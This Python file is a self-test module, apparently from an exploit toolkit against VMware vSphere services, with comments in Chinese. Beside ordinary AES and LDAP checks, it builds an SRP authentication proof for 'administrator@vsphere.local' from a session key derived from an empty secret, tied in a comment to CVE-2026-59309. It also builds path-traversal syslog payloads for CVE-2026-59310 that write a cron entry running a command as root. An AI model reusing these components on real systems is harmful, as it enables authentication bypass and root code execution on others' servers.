"""离线自检：AES 向量 / BER / SRP 缓冲与安全层 / 载荷构造。无需网络。"""
import secrets
import struct

from .aes128 import AES128OFB, _aes128_expand, aes128_encrypt_block
from .berldap import ber_parse_tlv, op_search
from .srp59309 import (SRPLayer, parse_server_options, decide_client_options,
                       srp_frame, srp_s, srp_os)
from .syslog59310 import (build_rfc5424, traversal_app, traversal_host)
from .util import SHA1_EMPTY, i2b


def run(verbose=True):
    ok = True
    out = (lambda s: print(s)) if verbose else (lambda s: None)

    # AES-128 FIPS-197 向量
    key = bytes(range(16))
    pt = bytes.fromhex("00112233445566778899aabbccddeeff")
    want = bytes.fromhex("69c4e0d86a7b0430d8cdb78070b4c55a")
    got = aes128_encrypt_block(pt, _aes128_expand(key))
    out("AES-128 FIPS-197      : %s" % ("OK" if got == want else "FAIL " + got.hex()))
    ok &= got == want

    # OFB 对称性
    iv = secrets.token_bytes(16)
    data = b"hello SRP security layer, arbitrary length!"
    dec = AES128OFB(key, iv).crypt(AES128OFB(key, iv).crypt(data))
    out("AES-128-OFB roundtrip : %s" % ("OK" if dec == data else "FAIL"))
    ok &= dec == data

    # BER
    op = op_search("dc=x,dc=y", scope=2, ffilter="(cn=admin)")
    tag, _v, _ = ber_parse_tlv(op, 0)
    out("BER SearchRequest      : %s" % ("OK" if tag == 0x63 else "FAIL"))
    ok &= tag == 0x63

    # SRP 缓冲
    payload = (srp_s(b"administrator@vsphere.local") +
               srp_s(b"administrator@vsphere.local") + srp_s(b"") + srp_os(b""))
    framed = srp_frame(payload)
    good = framed[:4] == struct.pack(">I", len(payload))
    out("SRP buffer framing    : %s" % ("OK" if good else "FAIL"))
    ok &= good

    # 选项协商
    L = ("mda=SHA-1,replay_detection,integrity=HMAC-SHA-1,confidentiality=AES,"
         "mandatory=confidentiality,mandatory=integrity,mandatory=replay_detection")
    so = parse_server_options(L)
    opts = decide_client_options(so, "auto")
    good = opts == "mda=sha-1,integrity=hmac-sha-1,replay_detection,confidentiality=aes"
    out("SRP options negotiate  : %s  (%s)" % ("OK" if good else "FAIL", opts))
    ok &= good

    # K 常量
    good = SHA1_EMPTY.hex() == "da39a3ee5e6b4b0d3255bfef95601890afd80709"
    out("K = SHA1(\"\")           : %s" % ("OK" if good else "FAIL"))
    ok &= good

    # M1 确定性（CVE-2026-59309 输入全公开）
    import hashlib
    N = int("EEAF0AB9ADB38DD69C33F80AFA8FC5E86072618775FF3C0B9EA2314C9C256576D674DF7"
            "496EA81D3383B4813D692C6E0E0D5D8E250B98BE48E495C1D6089DAD15DC7D7B46154D6"
            "B6CE8EF4AD69B15D4982559B297BCF1885C529F566660E57EC68EDBC3C05726CC02FD4CB"
            "F4976EAA9AFD5138FE8376435B9FC61D2FC0EB06E3", 16)
    ident = b"administrator@vsphere.local"
    salt, Bv = b"\x11" * 16, 0x1234567890ABCDEF
    Ng = bytes(x ^ y for x, y in zip(hashlib.sha1(i2b(N)).digest(),
                                     hashlib.sha1(i2b(2)).digest()))
    m1 = hashlib.sha1(Ng + hashlib.sha1(ident).digest() + salt + i2b(N) + i2b(Bv) +
                      SHA1_EMPTY + hashlib.sha1(ident).digest() +
                      hashlib.sha1(L.encode()).digest()).digest()
    out("SRP M1 construct      : OK (%s…)" % m1.hex()[:16])

    # SRP 安全层双端互通（AES+HMAC+replay）：A=客户端方向，B=服务端方向
    cIV, sIV = secrets.token_bytes(16), secrets.token_bytes(16)
    A = SRPLayer(SHA1_EMPTY, cIV, sIV, True, True, True)   # 客户端: enc sIV / dec cIV
    B = SRPLayer(SHA1_EMPTY, sIV, cIV, True, True, True)   # 服务端: enc cIV / dec sIV
    pdu = op_search("dc=vsphere,dc=local", scope=0)
    back1 = B.unwrap(A.wrap(pdu)[4:])      # 客户端→服务端
    back2 = A.unwrap(B.wrap(pdu)[4:])      # 服务端→客户端
    good = back1 == pdu and back2 == pdu
    out("SRP layer both-ways   : %s" % ("OK" if good else "FAIL"))
    ok &= good

    # 59310 载荷
    app = traversal_app("etc/cron.d/x")
    good = app.startswith("rsyslog/") and "../" in app
    out("59310 app vector      : %s  (%s)" % ("OK" if good else "FAIL", app))
    ok &= good
    good = traversal_host("opt/vmware/share/htdocs/X").count("../") == 16
    out("59310 host vector     : %s" % ("OK" if good else "FAIL"))
    ok &= good
    pkt = build_rfc5424("h", app, "\n* * * * * root id\n#")
    good = pkt.startswith(b"<134>1 ") and b"root id" in pkt
    out("59310 packet build    : %s" % ("OK" if good else "FAIL"))
    ok &= good

    out("== selftest %s ==" % ("PASS" if ok else "FAIL"))
    return ok


if __name__ == "__main__":
    import sys
    sys.exit(0 if run() else 1)
